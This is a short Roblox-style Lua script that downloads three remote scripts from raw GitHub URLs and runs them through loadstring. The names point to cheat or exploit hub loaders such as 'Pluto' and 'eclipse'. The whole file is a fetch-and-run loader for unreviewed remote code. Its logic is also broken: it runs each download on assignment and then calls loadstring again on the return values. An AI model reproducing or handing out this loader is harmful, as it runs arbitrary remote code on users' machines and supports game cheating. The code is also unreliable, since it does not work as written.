local script1 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Allvideo/test/main/Whitelist.txt"))()
local script2 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Scrvpter/Pluto/Lua/Loader.Lua', true))()
local script3 = loadstring(game:HttpGet("https://raw.githubusercontent.com/NooobLorod/loadstrings/77b545213a3d5b5767767631f35162b48386866b/eclipse.lua"))()

local function executeScript(script)
    local thread = coroutine.create(function()
        loadstring(script)()
    end)
    coroutine.resume(thread)
end

executeScript(script1)
executeScript(script2)
executeScript(script3)
